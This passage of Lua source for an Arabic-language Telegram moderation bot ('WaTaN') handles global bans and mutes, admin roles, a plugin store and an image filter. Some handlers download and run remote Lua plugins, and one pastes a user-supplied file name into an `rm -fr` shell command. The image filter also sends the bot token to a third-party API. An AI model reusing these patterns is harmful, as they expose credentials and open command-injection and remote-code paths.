tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم حظره عام من *'..Groups..'* كروب'
send(msg.chat_id_, msg.id_, usertext..status)
else
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم حظره عام من *'..Groups..'* كروب'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("كتم عام") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ✯︙لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع كتم البوت عام")
return false 
end
database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتمه عام من *'..Groups..'* كروب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم عام @(.*)$") and ChanSub(msg)  and DevWaTaN(msg) then
local username = text:match("^كتم عام @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع كتم البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ✯︙لا يمكنك كتم المطور الاساسي \n")
return false 
end
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتمه عام من *'..Groups..'* كروب'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local userid = text:match("^كتم عام (%d+)$")
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ✯︙لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع كتم البوت عام")
return false 
end
database:sadd(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتمه عام من *'..Groups..'* كروب'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم كتمه عام من *'..Groups..'* كروب'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء حظر عام") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء حظره عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GBan:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("الغاء العام") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء كتمه عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("الغاء العام") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء (الحظر-الكتم) عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GBan:User', result.sender_user_id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء حظر عام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
local username = text:match("^الغاء حظر عام @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء حظره عام من الكروبات'
texts = usertext..status
database:srem(bot_id..'GBan:User', result.id_)
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم عام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
local username = text:match("^الغاء كتم عام @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء كتمه عام من الكروبات'
texts = usertext..status
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
local username = text:match("^الغاء العام @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء (الحظر-الكتم) عام من الكروبات'
texts = usertext..status
database:srem(bot_id..'GBan:User', result.id_)
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء حظر عام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local userid = text:match("^الغاء حظر عام (%d+)$")
database:srem(bot_id..'GBan:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء حظره عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم حظره عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match("^الغاء كتم عام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local userid = text:match("^الغاء كتم عام (%d+)$")
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء كتمه عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم حظره عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local userid = text:match("^الغاء العام (%d+)$")
database:srem(bot_id..'GBan:User', userid)
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء (الحظر-الكتم) عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم حظره عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("مسح المطورين") and ChanSub(msg) and DevWaTaN(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n✯︙تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and ChanSub(msg) and DevWaTaN(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n✯︙قائمة مطورين البوت \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == 'الملفات' and ChanSub(msg) and DevWaTaN(msg) then
t = '✯︙ملفات السورس وطن ↓\n ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'- الملف » {'..v..'}\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "متجر الملفات" and ChanSub(msg) or text == 'المتجر' and ChanSub(msg) then
if DevWaTaN(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n✯︙اهلا بك في متجر ملفات وطن\n✯︙ملفات السورس ↓\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n\n"
local TextE = "\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙علامة تعني { ✔️ } ملف مفعل\n✯︙علامة تعني { ✖ } ملف معطل\n✯︙قناة سورس وطن ↓\n".." ✯︙[اضغط هنا لدخول](t.me/WaTaNTeaM) \n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("File_Bot/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(✔️)"
else
CeckFile = "(✖)"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.."→* {`"..name..'`} » '..CeckFile..'\n[-Information]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_," ✯︙لا يوجد اتصال من ال api \n") 
end
return false
end
end

if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and ChanSub(msg) and DevWaTaN(msg) then
local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ✯︙الملف » "..file.."\n✯︙تم تعطيل ملف \n"
else
t = " ✯︙بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('WaTaN.lua')  
else
send(msg.chat_id_, msg.id_," ✯︙عذرا الملف لايدعم سورس وطن \n") 
end
return false
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and ChanSub(msg) and DevWaTaN(msg) then
local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ✯︙بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " ✯︙الملف » "..file.."\n✯︙تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/"..file)
if res == 200 then
local chek = io.open("File_Bot/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('WaTaN.lua')  
else
send(msg.chat_id_, msg.id_," ✯︙عذرا الملف لايدعم سورس وطن \n") 
end
return false
end

if text and text:match("^(تعطيل) (.*)(.lua)$") and ChanSub(msg) and DevWaTaN(msg) then
local name_t = {string.match(text, "^(تعطيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ✯︙الملف » "..file.."\n✯︙تم تعطيل ملف \n"
else
t = " ✯︙بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('WaTaN.lua')  
else
send(msg.chat_id_, msg.id_," ✯︙عذرا الملف لايدعم سورس وطن \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and ChanSub(msg) and DevWaTaN(msg) then
local name_t = {string.match(text, "^(تفعيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ✯︙بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " ✯︙الملف » "..file.."\n✯︙تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/"..file)
if res == 200 then
local chek = io.open("File_Bot/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('WaTaN.lua')  
else
send(msg.chat_id_, msg.id_," ✯︙عذرا الملف لايدعم سورس وطن \n") 
end
return false
end
if text == "مسح الملفات" and ChanSub(msg) and DevWaTaN(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ✯︙تم مسح الملفات")
return false
end

if text == ("رفع مطور") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
function start_function(extra, result, success)
database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
local username = text:match("^رفع مطور @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مطور'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local userid = text:match("^رفع مطور (%d+)$")
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مطور") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المطورين'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("مسح المالكين") and ChanSub(msg) and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
database:sadd(bot_id..'CoSu'..msg.chat_id_,database:get(bot_id..'CoSuv'..msg.chat_id_))
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح قائمه المالك')
return false
end

if text == 'قائمه المالك' and ChanSub(msg) and Sudo(msg) or text == 'المالكين' and ChanSub(msg) and Sudo(msg) then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n✯︙قائمه المالك \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("صيح للمالكين") and ChanSub(msg) or text == ("تاك للمالكين") and ChanSub(msg) then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("صيح للمالك") and ChanSub(msg) or text == ("تاك للمالك") and ChanSub(msg) then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n✯︙وينكم تعالو يريدوكم بالكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع مالك") and ChanSub(msg) and msg.reply_to_message_id_ and Sudo(msg) then
function start_function(extra, result, success)
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مالك @(.*)$") and ChanSub(msg) and Sudo(msg) then
local username = text:match("^رفع مالك @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مالك'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع مالك (%d+)$") and ChanSub(msg) and Sudo(msg) then
local userid = text:match("^رفع مالك (%d+)$") 
database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل مالك") and ChanSub(msg) and msg.reply_to_message_id_ and Sudo(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المالكين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك @(.*)$") and ChanSub(msg) and Sudo(msg) then
local username = text:match("^تنزيل مالك @(.*)$")
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المالكين'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك (%d+)$") and ChanSub(msg) and Sudo(msg) then
local userid = text:match("^تنزيل مالك (%d+)$") 
database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المالكين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من المالكين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessagePhoto" or msg.content_.ID == "MessageSticker" then
if database:get(bot_id.."Abs:Lock:NightClub"..msg.chat_id_) and msg.reply_to_message_id_ == 0 then
if msg.content_.ID == "MessagePhoto" then Media = 'صوره اباحيه' UrlId = msg.content_.photo_.sizes_[1].photo_.persistent_id_
elseif msg.content_.ID == "MessageSticker" then Media = 'ملصق اباحي' UrlId = msg.content_.sticker_.sticker_.persistent_id_
end  
HttpsMsg = https.request('https://api-watan.ml/abahi/abahi.php?Get=WaTaN&TokenBot='..token..'&Url='..UrlId)
EndMsg = JSON.decode(HttpsMsg)
if EndMsg.Result.Info == "Indecent" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local absname = '✯︙العضو ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local absid = '✯︙ايديه ↫ '..dp.id_..''
local abstext = '✯︙قام بنشر '..Media
local abstxt = 'ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_  
text = '\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n'
for i=0 , #admins do 
if not abbas.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
sendText(msg.chat_id_, absname..'\n'..absid..'\n'..abstext..text..abstxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
end
end
if text == 'تفعيل التحويل' and ChanSub(msg) and CoSu(msg) then   
if database:get(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التحويل' and ChanSub(msg) and CoSu(msg) then  
if not database:get(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_) then
database:set(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر تحويل'
else
Text = '\n✯︙بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تحويل' and not database:get(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.photo_ then 
local pn = result.content_.photo_.sizes_[1].photo_.persistent_id_
Addsticker(msg,msg.chat_id_,pn,msg.sender_user_id_..'.png')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and ChanSub(msg) and not database:get(bot_id..'WaTTTaN:change:WaTaN'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
